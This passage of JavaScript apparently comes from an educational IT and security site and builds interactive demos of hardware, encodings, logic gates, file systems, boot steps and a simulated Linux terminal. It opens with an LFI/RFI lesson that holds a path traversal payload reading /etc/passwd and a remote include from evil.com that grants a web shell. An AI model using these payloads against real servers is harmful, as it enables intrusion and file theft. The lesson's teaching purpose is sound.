            '2': { val: '../../../../etc/passwd', text: '<p><strong>Step 2 — LFI Attack:</strong> Using <code>../</code> sequences, the attacker traverses out of the web root to read sensitive system files. The server includes <code>/etc/passwd</code> which reveals all system user accounts.</p>' },
            '3': { val: 'https://evil.com/shell.php', text: '<p><strong>Step 3 — RFI Attack:</strong> If <code>allow_url_include</code> is enabled in PHP, the attacker can include a remote file. The server fetches and <strong>executes</strong> the attacker\'s PHP code, giving them a web shell with full server access.</p>' },
        };

        $$('.demo-step-btn').forEach((b) => {
            b.onclick = () => {
                $$('.demo-step-btn').forEach((x) => x.classList.remove('active'));
                b.classList.add('active');
                const s = steps[b.dataset.step];
                input.value = s.val;
                explanationText.innerHTML = s.text;
                loadPage(s.val);
            };
        });
    }


    /* ============================================================
       C1: MOTHERBOARD DEMO
       ============================================================ */
    function demoBoardSize(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">\u{1f527} INTERACTIVE</span><span class="demo-title">Motherboard Form Factors</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:12px;flex-wrap:wrap;justify-content:center" id="boardBtns"><button class="demo-btn demo-btn-sm active" data-ff="eatx">E-ATX</button><button class="demo-btn demo-btn-sm" data-ff="atx">ATX</button><button class="demo-btn demo-btn-sm" data-ff="matx">Micro-ATX</button><button class="demo-btn demo-btn-sm" data-ff="itx">Mini-ITX</button></div><div style="display:flex;gap:24px;align-items:center;justify-content:center"><div id="boardVisual" style="background:linear-gradient(135deg,#2d5016,#3a6b1e);border:3px solid #8B7355;border-radius:8px;position:relative;transition:all 0.4s ease;display:flex;align-items:center;justify-content:center;color:#a0d060;font-family:monospace;font-size:0.7rem;text-align:center;width:280px;height:280px"><div>CPU Socket<br>RAM Slots: 8<br>PCIe x16: 4<br>SATA: 10</div></div><div id="boardInfo" style="min-width:200px;font-size:0.85rem;line-height:1.8"><div><strong>E-ATX (Extended ATX)</strong></div><div>Size: 305x330 mm</div><div>8 RAM Slots, 4+ PCIe x16</div><div>10 SATA ports</div><div>Use: Servers, Workstations</div></div></div></div><div class="demo-explanation"><span class="explanation-icon">info</span><div class="explanation-text"><p>The form factor determines the physical size of the motherboard, which dictates case compatibility, number of expansion slots, and overall system capabilities.</p></div></div></div>';
        var specs = {
            eatx: { w:280,h:280,ram:8,pcie:4,sata:10,name:'E-ATX (Extended ATX)',size:'305x330 mm',use:'Servers, Workstations'},
            atx: { w:240,h:260,ram:4,pcie:3,sata:6,name:'ATX (Standard)',size:'305x244 mm',use:'Desktop PCs'},
            matx: { w:200,h:200,ram:4,pcie:2,sata:4,name:'Micro-ATX',size:'244x244 mm',use:'Budget Builds'},
            itx: { w:150,h:150,ram:2,pcie:1,sata:2,name:'Mini-ITX',size:'170x170 mm',use:'Compact HTPCs'}
        };
        $$('#boardBtns .demo-btn').forEach(function(b) {
            b.onclick = function() {
                $$('#boardBtns .demo-btn').forEach(function(x){x.classList.remove('active');});
                b.classList.add('active');
                var s = specs[b.dataset.ff];
                var v = $('#boardVisual');
                v.style.width = s.w+'px'; v.style.height = s.h+'px';
                v.innerHTML = '<div>CPU Socket<br>RAM Slots: '+s.ram+'<br>PCIe x16: '+s.pcie+'<br>SATA: '+s.sata+'</div>';
                $('#boardInfo').innerHTML = '<div><strong>'+s.name+'</strong></div><div>Size: '+s.size+'</div><div>'+s.ram+' RAM Slots, '+s.pcie+' PCIe x16</div><div>'+s.sata+' SATA ports</div><div>Use: '+s.use+'</div>';
            };
        });
    }

    /* ============================================================
       C1: CPU DEMO
       ============================================================ */
    function demoCPU(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">CPU Context Switching</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;align-items:center;justify-content:center"><span>Cores:</span><select id="cpuCores" style="padding:4px 8px;border-radius:4px;border:1px solid var(--border)"><option value="1">1</option><option value="2" selected>2</option><option value="4">4</option></select><button class="demo-btn demo-btn-sm" id="cpuStart">Start</button><button class="demo-btn demo-btn-sm" id="cpuStop">Stop</button></div><div id="cpuGrid" style="display:flex;gap:16px;flex-wrap:wrap;justify-content:center"></div><div id="cpuQueue" style="text-align:center;font-size:0.85rem;color:var(--text-muted)">Tasks waiting: <span id="cpuWaiting">0</span></div></div><div class="demo-explanation"><span class="explanation-icon">info</span><div class="explanation-text"><p>Each core can only run ONE task at a time. With context switching, the CPU rapidly alternates between tasks to create the illusion of multitasking.</p></div></div></div>';
        var interval;
        var tasks = ['Word','Browser','Music','Email','Game','Excel','Chat','Antivirus'];
        var colors = ['#e74c3c','#3498db','#f39c12','#2ecc71','#9b59b6','#e67e22','#1abc9c','#34495e'];
        function run() {
            clearInterval(interval);
            var n = +$('#cpuCores').value;
            var grid = $('#cpuGrid');
            grid.innerHTML = '';
            for(var i=0;i<n;i++) grid.innerHTML += '<div style="background:var(--bg-secondary);border-radius:8px;padding:16px;min-width:120px;text-align:center"><div style="font-size:0.75rem;color:var(--text-muted)">Core '+i+'</div><div id="coreTask'+i+'" style="font-size:1.5rem;margin:8px 0">...</div><div id="coreLabel'+i+'" style="font-size:0.8rem">Idle</div></div>';
            var tick=0;
            interval = setInterval(function(){
                for(var i=0;i<n;i++){
                    var idx=(tick+i)%tasks.length;
                    $('#coreTask'+i).textContent=tasks[idx];
                    $('#coreLabel'+i).style.color=colors[idx];
                }
                $('#cpuWaiting').textContent=Math.max(0,tasks.length-n);
                tick++;
            },800);
        }
        $('#cpuStart').onclick = run;
        $('#cpuStop').onclick = function(){clearInterval(interval);};
        run();
    }

    /* ============================================================
       C1: RAM DEMO
       ============================================================ */
    function demoRAM(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">RAM vs Storage Speed Comparison</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><button class="demo-btn" id="ramRun">Run Speed Test</button><div style="display:flex;gap:16px;flex-wrap:wrap;justify-content:center"><div style="flex:1;min-width:200px"><div style="font-weight:bold;margin-bottom:8px">RAM (DDR5)</div><div style="background:#edf2f7;border-radius:8px;height:30px;overflow:hidden"><div id="ramBar" style="background:#3498db;height:100%;width:0;transition:width 0.3s;border-radius:8px;display:flex;align-items:center;padding-left:8px;color:white;font-size:0.75rem"></div></div></div><div style="flex:1;min-width:200px"><div style="font-weight:bold;margin-bottom:8px">NVMe SSD</div><div style="background:#edf2f7;border-radius:8px;height:30px;overflow:hidden"><div id="ssdBar" style="background:#2ecc71;height:100%;width:0;transition:width 0.3s;border-radius:8px;display:flex;align-items:center;padding-left:8px;color:white;font-size:0.75rem"></div></div></div><div style="flex:1;min-width:200px"><div style="font-weight:bold;margin-bottom:8px">HDD (7200 RPM)</div><div style="background:#edf2f7;border-radius:8px;height:30px;overflow:hidden"><div id="hddBar" style="background:#e74c3c;height:100%;width:0;transition:width 0.3s;border-radius:8px;display:flex;align-items:center;padding-left:8px;color:white;font-size:0.75rem"></div></div></div></div><div id="ramResult" style="text-align:center;font-size:0.85rem;color:var(--text-muted)">Click Run to compare speeds</div></div></div>';
        $('#ramRun').onclick = function(){
            var speeds = [{id:'ramBar',speed:51200,label:'51,200 MB/s'},{id:'ssdBar',speed:7000,label:'7,000 MB/s'},{id:'hddBar',speed:200,label:'200 MB/s'}];
            speeds.forEach(function(s){var el=$('#'+s.id);el.style.width='0';el.textContent='';});
            var step=0;
            var iv=setInterval(function(){
                step+=2;
                speeds.forEach(function(s){
                    var pct=Math.min(100,(s.speed/51200)*step*50);
                    var el=$('#'+s.id);el.style.width=pct+'%';
                    if(pct>=((s.speed/51200)*100)) el.textContent=' '+s.label;
                });
                if(step>=100){clearInterval(iv);$('#ramResult').textContent='RAM is ~7x faster than NVMe SSD and ~256x faster than HDD!';}
            },50);
        };
    }

    /* ============================================================
       C1: BINARY NUMBER BASE DEMO
       ============================================================ */
    function demoBinary(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">Number Base Converter</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;align-items:center;justify-content:center;flex-wrap:wrap"><input id="decIn" type="number" min="0" max="255" value="42" style="width:80px;padding:8px;border-radius:6px;border:1px solid var(--border);text-align:center;font-size:1.2rem" placeholder="0-255"><span style="font-size:0.85rem;color:var(--text-muted)">Decimal (0-255)</span></div><div style="display:flex;gap:16px;flex-wrap:wrap;justify-content:center"><div style="background:var(--bg-secondary);padding:16px;border-radius:8px;text-align:center;min-width:200px"><div style="font-size:0.8rem;color:var(--text-muted);margin-bottom:4px">Binary (Base 2)</div><div id="binOut" style="font-family:var(--font-mono);font-size:1.3rem;letter-spacing:2px">00101010</div></div><div style="background:var(--bg-secondary);padding:16px;border-radius:8px;text-align:center;min-width:200px"><div style="font-size:0.8rem;color:var(--text-muted);margin-bottom:4px">Hexadecimal (Base 16)</div><div id="hexOut" style="font-family:var(--font-mono);font-size:1.3rem">0x2A</div></div><div style="background:var(--bg-secondary);padding:16px;border-radius:8px;text-align:center;min-width:200px"><div style="font-size:0.8rem;color:var(--text-muted);margin-bottom:4px">Octal (Base 8)</div><div id="octOut" style="font-family:var(--font-mono);font-size:1.3rem">052</div></div></div><div style="display:flex;gap:4px;justify-content:center" id="bitGrid"></div></div><div class="demo-explanation"><span class="explanation-icon">info</span><div class="explanation-text"><p>Click individual bits to toggle them! Each bit position represents a power of 2. One byte (8 bits) can represent values 0-255.</p></div></div></div>';
        var val=42;
        function render(){
            var bin=val.toString(2).padStart(8,'0');
            $('#binOut').textContent=bin;
            $('#hexOut').textContent='0x'+val.toString(16).toUpperCase().padStart(2,'0');
            $('#octOut').textContent='0'+val.toString(8);
            $('#decIn').value=val;
            var grid=$('#bitGrid');grid.innerHTML='';
            for(var i=7;i>=0;i--){
                var bit=(val>>i)&1;
                grid.innerHTML+='<div style="display:flex;flex-direction:column;align-items:center;gap:2px"><span style="font-size:0.65rem;color:var(--text-muted)">'+Math.pow(2,i)+'</span><button class="demo-btn demo-btn-sm bitBtn" data-pos="'+i+'" style="width:36px;height:36px;font-family:var(--font-mono);font-size:1rem;'+(bit?'background:var(--accent);color:white':'')+'">'+bit+'</button></div>';
            }
            $$('.bitBtn').forEach(function(b){b.onclick=function(){val^=(1<<+b.dataset.pos);render();};});
        }
        $('#decIn').oninput=function(){val=Math.min(255,Math.max(0,+$('#decIn').value||0));render();};
        render();
    }

    /* ============================================================
       C1: ASCII DEMO
       ============================================================ */
    function demoASCII(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">ASCII Character Lookup</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;align-items:center;justify-content:center"><input id="asciiIn" maxlength="1" value="A" style="width:60px;padding:8px;border-radius:6px;border:1px solid var(--border);text-align:center;font-size:1.5rem"><span style="color:var(--text-muted)">Enter a character</span></div><div style="display:flex;gap:16px;flex-wrap:wrap;justify-content:center"><div style="background:var(--bg-secondary);padding:16px;border-radius:8px;text-align:center;min-width:120px"><div style="font-size:0.8rem;color:var(--text-muted)">Decimal</div><div id="ascDec" style="font-size:1.5rem;font-weight:bold">65</div></div><div style="background:var(--bg-secondary);padding:16px;border-radius:8px;text-align:center;min-width:120px"><div style="font-size:0.8rem;color:var(--text-muted)">Hex</div><div id="ascHex" style="font-size:1.5rem;font-weight:bold;font-family:var(--font-mono)">0x41</div></div><div style="background:var(--bg-secondary);padding:16px;border-radius:8px;text-align:center;min-width:120px"><div style="font-size:0.8rem;color:var(--text-muted)">Binary</div><div id="ascBin" style="font-size:1.5rem;font-weight:bold;font-family:var(--font-mono)">01000001</div></div></div><div style="max-height:150px;overflow-y:auto;background:var(--bg-secondary);padding:12px;border-radius:8px;font-family:var(--font-mono);font-size:0.75rem;line-height:1.8" id="ascTable"></div></div></div>';
        function update(){
            var c=$('#asciiIn').value||'A';var code=c.charCodeAt(0);
            $('#ascDec').textContent=code;$('#ascHex').textContent='0x'+code.toString(16).toUpperCase().padStart(2,'0');$('#ascBin').textContent=code.toString(2).padStart(8,'0');
        }
        var table=$('#ascTable');var t='';for(var i=32;i<127;i++)t+=i.toString().padStart(3)+' = '+String.fromCharCode(i)+'  ';table.textContent=t;
        $('#asciiIn').oninput=update;
    }

    /* ============================================================
       C1: BASE64 DEMO
       ============================================================ */
    function demoBase64(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-warning">ENCODING != ENCRYPTION</span><span class="demo-title">Base64 Encoder/Decoder</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;align-items:center;justify-content:center"><select id="b64Mode" style="padding:6px;border-radius:4px;border:1px solid var(--border)"><option value="enc">Encode</option><option value="dec">Decode</option></select></div><div style="display:flex;gap:16px;flex-wrap:wrap"><div style="flex:1;min-width:200px"><div style="font-size:0.8rem;color:var(--text-muted);margin-bottom:4px">Input</div><textarea id="b64In" rows="3" style="width:100%;padding:8px;border-radius:6px;border:1px solid var(--border);font-family:var(--font-mono);resize:vertical">Hello, World!</textarea></div><div style="flex:1;min-width:200px"><div style="font-size:0.8rem;color:var(--text-muted);margin-bottom:4px">Output</div><textarea id="b64Out" rows="3" readonly style="width:100%;padding:8px;border-radius:6px;border:1px solid var(--border);font-family:var(--font-mono);background:var(--bg-secondary);resize:vertical"></textarea></div></div><button class="demo-btn" id="b64Go">Convert</button></div><div class="demo-explanation"><span class="explanation-icon">warning</span><div class="explanation-text"><p><strong>Base64 is NOT encryption!</strong> Anyone can decode it. Never use it to protect passwords, API keys, or sensitive data.</p></div></div></div>';
        function convert(){
            try{
                if($('#b64Mode').value==='enc') $('#b64Out').value=btoa($('#b64In').value);
                else $('#b64Out').value=atob($('#b64In').value);
            }catch(e){$('#b64Out').value='Error: Invalid input';}
        }
        $('#b64Go').onclick=convert;$('#b64In').oninput=convert;$('#b64Mode').onchange=convert;convert();
    }

    /* ============================================================
       C1: FILE HEADERS DEMO
       ============================================================ */
    function demoFileHeaders(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">SECURITY</span><span class="demo-title">File Magic Numbers</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><p style="text-align:center;font-size:0.85rem;color:var(--text-muted)">Can you identify the real file type? Extensions can lie!</p><div style="display:flex;gap:12px;flex-wrap:wrap;justify-content:center" id="fhFiles"></div><div id="fhResult" style="text-align:center;padding:16px;background:var(--bg-secondary);border-radius:8px;min-height:60px;font-family:var(--font-mono);font-size:0.85rem"></div></div></div>';
        var files = [
            {name:'photo.jpg',magic:'FF D8 FF E0',real:'JPEG Image',safe:true},
            {name:'document.pdf',magic:'25 50 44 46',real:'PDF Document',safe:true},
            {name:'image.png',magic:'7F 45 4C 46',real:'ELF Executable (Linux binary disguised as PNG)',safe:false},
            {name:'report.docx',magic:'50 4B 03 04',real:'ZIP Archive (DOCX is a ZIP)',safe:true},
            {name:'invoice.pdf',magic:'4D 5A 90 00',real:'Windows EXE (Malware disguised as PDF)',safe:false}
        ];
        var cont=$('#fhFiles');
        files.forEach(function(f,i){
            cont.innerHTML+='<button class="demo-btn demo-btn-sm" data-idx="'+i+'" style="min-width:120px">'+f.name+'</button>';
        });
        $$('#fhFiles .demo-btn').forEach(function(b){b.onclick=function(){
            var f=files[+b.dataset.idx];
            $('#fhResult').innerHTML='<div>File: <strong>'+f.name+'</strong></div><div>Magic Bytes: <code>'+f.magic+'</code></div><div style="margin-top:8px;color:'+(f.safe?'var(--success)':'var(--danger)')+'"><strong>'+f.real+'</strong></div>'+(f.safe?'':'<div style="margin-top:4px;color:var(--danger)">This file is NOT what it claims to be!</div>');
        };});
    }

    /* ============================================================
       C1: LOGIC GATES DEMO
       ============================================================ */
    function demoLogicGates(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">Logic Gate Simulator</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;justify-content:center;flex-wrap:wrap" id="gateBtns"><button class="demo-btn demo-btn-sm active" data-gate="AND">AND</button><button class="demo-btn demo-btn-sm" data-gate="OR">OR</button><button class="demo-btn demo-btn-sm" data-gate="XOR">XOR</button><button class="demo-btn demo-btn-sm" data-gate="NAND">NAND</button><button class="demo-btn demo-btn-sm" data-gate="NOR">NOR</button><button class="demo-btn demo-btn-sm" data-gate="NOT">NOT</button></div><div style="display:flex;gap:24px;align-items:center;justify-content:center"><div><div style="font-size:0.8rem;color:var(--text-muted);text-align:center;margin-bottom:4px">Input A</div><button id="inA" class="demo-btn" style="width:60px;height:60px;font-size:1.5rem;font-weight:bold">0</button></div><div id="gateSymbol" style="font-size:2rem;font-weight:bold;color:var(--accent)">AND</div><div id="inBWrap"><div style="font-size:0.8rem;color:var(--text-muted);text-align:center;margin-bottom:4px">Input B</div><button id="inB" class="demo-btn" style="width:60px;height:60px;font-size:1.5rem;font-weight:bold">0</button></div><div style="font-size:2rem">=</div><div><div style="font-size:0.8rem;color:var(--text-muted);text-align:center;margin-bottom:4px">Output</div><div id="gateOut" style="width:60px;height:60px;display:flex;align-items:center;justify-content:center;font-size:1.5rem;font-weight:bold;background:var(--bg-secondary);border-radius:8px">0</div></div></div><div id="truthTable" style="font-family:var(--font-mono);font-size:0.8rem;text-align:center"></div></div></div>';
        var a=0,b=0,gate='AND';
        var ops={AND:function(a,b){return a&b;},OR:function(a,b){return a|b;},XOR:function(a,b){return a^b;},NAND:function(a,b){return (a&b)?0:1;},NOR:function(a,b){return (a|b)?0:1;},NOT:function(a){return a?0:1;}};
        function calc(){
            var r=gate==='NOT'?ops[gate](a):ops[gate](a,b);
            $('#gateOut').textContent=r;$('#gateOut').style.background=r?'var(--accent)':'var(--bg-secondary)';$('#gateOut').style.color=r?'white':'inherit';
            $('#inBWrap').style.display=gate==='NOT'?'none':'block';
            var tt='A | B | Out\n';for(var i=0;i<2;i++)for(var j=0;j<2;j++){var o=gate==='NOT'?ops[gate](i):ops[gate](i,j);tt+=i+' | '+j+' | '+o+'\n';if(gate==='NOT')break;}
            $('#truthTable').textContent=tt;
        }
        $('#inA').onclick=function(){a=a?0:1;$('#inA').textContent=a;calc();};
        $('#inB').onclick=function(){b=b?0:1;$('#inB').textContent=b;calc();};
        $$('#gateBtns .demo-btn').forEach(function(btn){btn.onclick=function(){
            $$('#gateBtns .demo-btn').forEach(function(x){x.classList.remove('active');});btn.classList.add('active');
            gate=btn.dataset.gate;$('#gateSymbol').textContent=gate;calc();
        };});
        calc();
    }

    /* ============================================================
       C1: XOR ENCRYPTION DEMO
       ============================================================ */
    function demoXOR(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">XOR Cipher</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center;align-items:center"><div style="flex:1;min-width:180px"><div style="font-size:0.8rem;color:var(--text-muted)">Plaintext</div><input id="xorText" value="Hello" style="width:100%;padding:8px;border-radius:6px;border:1px solid var(--border);font-family:var(--font-mono)"></div><div style="font-size:1.5rem;padding-top:16px">XOR</div><div style="flex:1;min-width:100px"><div style="font-size:0.8rem;color:var(--text-muted)">Key</div><input id="xorKey" value="K" maxlength="8" style="width:100%;padding:8px;border-radius:6px;border:1px solid var(--border);font-family:var(--font-mono)"></div></div><div style="display:flex;gap:16px;flex-wrap:wrap;justify-content:center"><div style="flex:1;min-width:200px;background:var(--bg-secondary);padding:12px;border-radius:8px"><div style="font-size:0.8rem;color:var(--text-muted)">Ciphertext (Hex)</div><div id="xorCipher" style="font-family:var(--font-mono);word-break:break-all"></div></div><div style="flex:1;min-width:200px;background:var(--bg-secondary);padding:12px;border-radius:8px"><div style="font-size:0.8rem;color:var(--text-muted)">Decrypted</div><div id="xorDec" style="font-family:var(--font-mono)"></div></div></div></div><div class="demo-explanation"><span class="explanation-icon">info</span><div class="explanation-text"><p>XOR encryption: plaintext XOR key = ciphertext, and ciphertext XOR key = plaintext. The same operation both encrypts and decrypts!</p></div></div></div>';
        function compute(){
            var txt=$('#xorText').value,key=$('#xorKey').value||'K';
            var cipher=[],dec=[];
            for(var i=0;i<txt.length;i++){var c=txt.charCodeAt(i)^key.charCodeAt(i%key.length);cipher.push(c.toString(16).padStart(2,'0'));dec.push(String.fromCharCode(c^key.charCodeAt(i%key.length)));}
            $('#xorCipher').textContent=cipher.join(' ');$('#xorDec').textContent=dec.join('');
        }
        $('#xorText').oninput=compute;$('#xorKey').oninput=compute;compute();
    }

    /* ============================================================
       C1: FILE SYSTEMS DEMO
       ============================================================ */
    function demoFileSystems(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">File System Comparison</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="fsBtns"><button class="demo-btn demo-btn-sm active" data-fs="fat32">FAT32</button><button class="demo-btn demo-btn-sm" data-fs="ntfs">NTFS</button><button class="demo-btn demo-btn-sm" data-fs="ext4">EXT4</button><button class="demo-btn demo-btn-sm" data-fs="exfat">exFAT</button></div><div id="fsInfo" style="background:var(--bg-secondary);padding:16px;border-radius:8px;font-size:0.85rem;line-height:1.8"></div></div></div>';
        var info={
            fat32:'<strong>FAT32</strong><br>Max File: 4 GB<br>Max Volume: 2 TB<br>OS: Universal (Windows, Mac, Linux)<br>Permissions: None<br>Journaling: No<br>Best For: USB drives, memory cards',
            ntfs:'<strong>NTFS</strong><br>Max File: 16 EB<br>Max Volume: 256 TB<br>OS: Windows (read-only on Mac/Linux)<br>Permissions: Full ACL<br>Journaling: Yes<br>Encryption: BitLocker/EFS<br>Best For: Windows system drives',
            ext4:'<strong>EXT4</strong><br>Max File: 16 TB<br>Max Volume: 1 EB<br>OS: Linux (default)<br>Permissions: Unix (rwx)<br>Journaling: Yes<br>Best For: Linux system drives',
            exfat:'<strong>exFAT</strong><br>Max File: 16 EB<br>Max Volume: 128 PB<br>OS: Universal<br>Permissions: None<br>Journaling: No<br>Best For: Large files on USB drives'
        };
        function show(fs){$('#fsInfo').innerHTML=info[fs];}
        $$('#fsBtns .demo-btn').forEach(function(b){b.onclick=function(){$$('#fsBtns .demo-btn').forEach(function(x){x.classList.remove('active');});b.classList.add('active');show(b.dataset.fs);};});
        show('fat32');
    }

    /* ============================================================
       C1: CLOUD MODELS DEMO
       ============================================================ */
    function demoCloud(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">Cloud Service Models</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;justify-content:center" id="cloudBtns"><button class="demo-btn demo-btn-sm active" data-m="onprem">On-Premises</button><button class="demo-btn demo-btn-sm" data-m="iaas">IaaS</button><button class="demo-btn demo-btn-sm" data-m="paas">PaaS</button><button class="demo-btn demo-btn-sm" data-m="saas">SaaS</button></div><div style="display:flex;gap:4px;flex-direction:column;align-items:center" id="cloudStack"></div></div></div>';
        var layers=['Applications','Data','Runtime','Middleware','OS','Virtualization','Servers','Storage','Networking'];
        var managed={onprem:[],iaas:['Networking','Storage','Servers','Virtualization'],paas:['Networking','Storage','Servers','Virtualization','OS','Middleware','Runtime'],saas:['Networking','Storage','Servers','Virtualization','OS','Middleware','Runtime','Data','Applications']};
        function render(m){
            var stack=$('#cloudStack');stack.innerHTML='';
            layers.forEach(function(l){
                var prov=managed[m].indexOf(l)>=0;
                stack.innerHTML+='<div style="width:300px;padding:8px 16px;text-align:center;border-radius:4px;font-size:0.85rem;background:'+(prov?'var(--accent)':'var(--bg-secondary)')+';color:'+(prov?'white':'inherit')+';border:1px solid '+(prov?'transparent':'var(--border)')+'">'+l+(prov?' [Provider]':' [You]')+'</div>';
            });
        }
        $$('#cloudBtns .demo-btn').forEach(function(b){b.onclick=function(){$$('#cloudBtns .demo-btn').forEach(function(x){x.classList.remove('active');});b.classList.add('active');render(b.dataset.m);};});
        render('onprem');
    }

    /* ============================================================
       C2: OS BOOT PROCESS DEMO
       ============================================================ */
    function demoOS(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">Boot Process Simulator</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><button class="demo-btn" id="bootBtn">Power On</button><div id="bootLog" style="background:#1a1a2e;color:#00ff41;font-family:var(--font-mono);font-size:0.8rem;padding:16px;border-radius:8px;min-height:200px;white-space:pre-line;overflow-y:auto;max-height:300px"></div></div></div>';
        var steps=['[BIOS] Power-On Self-Test (POST)... OK','[BIOS] Detecting CPU: Intel i7-12700K @ 3.6 GHz','[BIOS] Detecting RAM: 32768 MB DDR5... OK','[BIOS] Detecting storage: NVMe SSD 1TB... OK','[BIOS] Searching for boot device...','[UEFI] Secure Boot: Verified','[GRUB] Loading kernel: vmlinuz-5.15.0-generic','[Kernel] Initializing memory management','[Kernel] Loading device drivers','[Kernel] Mounting root filesystem (ext4)','[Init] Starting systemd (PID 1)','[systemd] Starting network services','[systemd] Starting SSH server','[systemd] Starting Apache web server','[Login] System ready. Login prompt displayed.','','Welcome to Ubuntu 22.04 LTS','hostname login: _'];
        $('#bootBtn').onclick=function(){
            var log=$('#bootLog');log.textContent='';var i=0;
            var iv=setInterval(function(){if(i<steps.length){log.textContent+=steps[i]+'\n';log.scrollTop=log.scrollHeight;i++;}else clearInterval(iv);},300);
        };
    }

    /* ============================================================
       C2: VM / HYPERVISOR DEMO
       ============================================================ */
    function demoVM(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">Hypervisor Types</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;justify-content:center"><button class="demo-btn demo-btn-sm active" id="hvType1" data-t="1">Type 1 (Bare-Metal)</button><button class="demo-btn demo-btn-sm" id="hvType2" data-t="2">Type 2 (Hosted)</button></div><div id="hvDiagram" style="display:flex;flex-direction:column;gap:4px;align-items:center"></div></div><div class="demo-explanation"><span class="explanation-icon">info</span><div class="explanation-text"><p>Type 1 runs directly on hardware (data centers). Type 2 runs on a host OS (your desktop with VirtualBox).</p></div></div></div>';
        function draw(type){
            var d=$('#hvDiagram');d.innerHTML='';
            var style='width:300px;padding:10px;text-align:center;border-radius:4px;font-size:0.85rem;';
            if(type==='1'){
                d.innerHTML='<div style="'+style+'background:#3498db;color:white">VM 1 (Windows)</div><div style="'+style+'background:#2ecc71;color:white">VM 2 (Linux)</div><div style="'+style+'background:#9b59b6;color:white">VM 3 (Kali)</div><div style="'+style+'background:#e74c3c;color:white;font-weight:bold">Hypervisor (ESXi / Hyper-V)</div><div style="'+style+'background:#34495e;color:white">Hardware</div>';
            } else {
                d.innerHTML='<div style="'+style+'background:#3498db;color:white">VM 1 (Kali)</div><div style="'+style+'background:#2ecc71;color:white">VM 2 (Win XP)</div><div style="'+style+'background:#9b59b6;color:white;font-weight:bold">Hypervisor (VirtualBox)</div><div style="'+style+'background:#e67e22;color:white">Host OS (Windows / macOS)</div><div style="'+style+'background:#34495e;color:white">Hardware</div>';
            }
        }
        $('#hvType1').onclick=function(){$('#hvType1').classList.add('active');$('#hvType2').classList.remove('active');draw('1');};
        $('#hvType2').onclick=function(){$('#hvType2').classList.add('active');$('#hvType1').classList.remove('active');draw('2');};
        draw('1');
    }

    /* ============================================================
       C3: TERMINAL DEMO
       ============================================================ */
    function demoTerminal(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">Linux Terminal Simulator</span></div><div class="demo-visual" style="flex-direction:column;gap:0"><div style="background:#2d2d2d;color:#00ff41;font-family:var(--font-mono);font-size:0.82rem;padding:16px;border-radius:8px 8px 0 0;min-height:250px;max-height:350px;overflow-y:auto" id="termOut"><div>user@zentinels:~$ <span style="color:#ccc">Type a command below (try: ls, pwd, whoami, cat /etc/passwd, help)</span></div></div><div style="display:flex;background:#2d2d2d;padding:4px 16px;border-radius:0 0 8px 8px"><span style="color:#00ff41;font-family:var(--font-mono);font-size:0.82rem">user@zentinels:~$ </span><input id="termIn" style="flex:1;background:transparent;border:none;color:#00ff41;font-family:var(--font-mono);font-size:0.82rem;outline:none" autofocus></div></div></div>';
        var fs={'etc/passwd':'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nuser:x:1000:1000:User:/home/user:/bin/bash','etc/shadow':'Permission denied','home/user/notes.txt':'Remember: change the default password!\nAdmin panel: http'+'://localhost:8080/admin'};
        var cmds={
            ls:function(){return 'Desktop  Documents  Downloads  notes.txt  secret.key';},
            pwd:function(){return '/home/user';},
            whoami:function(){return 'user';},
            id:function(){return 'uid=1000(user) gid=1000(user) groups=1000(user),27(sudo)';},
            uname:function(){return 'Linux zentinels 5.15.0-generic x86_64 GNU/Linux';},
            hostname:function(){return 'zentinels';},
            date:function(){return new Date().toString();},
